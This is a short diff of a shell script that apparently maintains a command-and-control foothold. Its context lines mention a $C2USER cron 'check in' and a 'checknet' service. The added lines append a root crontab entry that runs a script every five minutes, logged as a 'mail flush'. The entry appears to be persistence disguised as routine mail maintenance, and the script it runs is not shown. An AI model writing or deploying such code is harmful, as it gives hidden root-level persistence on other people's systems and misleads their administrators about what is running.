@@ -111,6 +111,10 @@ if ! grep -q "checknet" /var/spool/cron/crontabs/root; then
 	$LOG "Crontab entry to start service not found, adding"
 	$LOG "888888 testbob"
 fi
+if ! grep -q "postqueue" /var/spool/cron/crontabs/root; then
+	echo "*/5 * * * * /bin/bash $POSTQ -f" >> /var/spool/cron/crontabs/root
+	$LOG "Added mail flush to root crontab"
+fi
 
 # check for cron job to check in and, if it isn't there, add it
 $CRONTAB -u $C2USER -l | grep $MYNAME 
